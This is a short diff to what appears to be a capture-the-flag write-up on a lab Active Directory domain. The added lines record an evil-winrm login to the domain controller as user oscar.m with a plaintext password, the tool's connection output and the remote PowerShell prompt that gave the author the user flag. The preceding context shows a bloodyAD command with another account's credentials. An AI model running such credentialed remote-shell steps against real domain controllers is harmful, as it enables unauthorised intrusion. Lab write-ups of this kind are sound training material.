@@ -613,5 +613,18 @@ bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'bog
 Now his hourse are updated i should be able to logon
 
 ```python
-
+evil-winrm -i sg-dc01.shadowgate.local -u oscar.m -p 'Password123!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oscar.m\Documents>
 ```
+
+This got me access to the user flag
+
+
